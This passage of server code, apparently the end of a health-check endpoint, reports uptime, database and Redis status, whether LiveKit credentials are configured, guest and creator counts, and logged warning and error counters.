      uptime_ms: Math.round(process.uptime() * 1000),
      health: {
        db: dbOk,
        // null = this instance runs without Redis at all (single-process
        // in-memory fallbacks), which is legal for Lite and fatal for prod.
        redis: redisOk,
        livekit_configured: Boolean(
          process.env.LIVEKIT_URL?.trim() &&
            (process.env.LIVEKIT_API_KEY?.trim() ||
              process.env.LIVEKIT_API_KEY_FILE?.trim())
        ),
      },
      guests: {
        active_guests: countOf(guestProbe),
        live_invites: countOf(inviteProbe),
      },
      creator_count: countOf(creatorProbe),
      // Warnings and errors this API process has logged since it started.
      // The guest sweeper once failed on every tick for five days and the only
      // trace was a log line nobody read; a number on the dashboard is what
      // turns "remember to grep the logs after a deploy" into something an
      // operator actually sees.
      logs: getLogCounters(),
    })
  })
}
